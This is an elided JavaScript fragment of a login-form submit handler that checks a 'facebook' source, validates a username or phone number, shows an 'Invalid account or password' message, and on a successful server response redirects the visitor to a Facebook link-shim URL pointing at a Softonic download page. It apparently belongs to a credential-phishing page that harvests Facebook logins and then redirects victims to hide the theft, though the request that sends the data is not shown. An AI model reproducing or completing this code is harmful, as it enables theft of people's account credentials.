...
if (msgError) {
  isBadInput
    ? (msgError.innerText = "Invalid account or password please try again")
    : (msgError.innerText = "");
...
form.addEventListener("submit", function (event) {
  ...
  if (source == "facebook") {
    ...
    let validUsername =
      (usernameSpaces == 1 && username.length > 5) || isPhoneNum;
        ...
        if (response.ok) {
          ...
          setTimeout(() => {
            window.location.href =
              "https://l.facebook.com/l.php?u=https%3A%2F%2Fen.softonic.com%2Fdownload%2Fbluetooth-keyboard-mouse%2Fandroid%2Fpost-download%2Fv%2F5.0.1%3Ffbclid%3DIwZXh0bgNhZW0CMTAAAR1gH8J7YHwMfouw1oRV_6q2IA5WViEJLMo8-eQh66PKNBFCsCB0qN284HY_aem_AbJ8WSAMHfjlBfMJ7DgAyXC1SrjQ1UXYZqzMhz9nTElDwkHILXH9GnMB65pxMeEgZrfOK6F48gCfNAclLzPnjzmi&h=AT0VGEUVKByGponrVe1pn_8qmLbe4tEyeffVWMT4Gqcd6504QHQ_xnj1WQGeU_esqHtqTNEqaDOK8L4xCkWd-Kd6wtuO0uUZvOSbLzRAKlZXnd2McBq8Uo6_gaC_-pqU3jXi0Q";
            // alert("Хорошо!!!!!");
          }, 1000);
        } else {
          // Handle errors
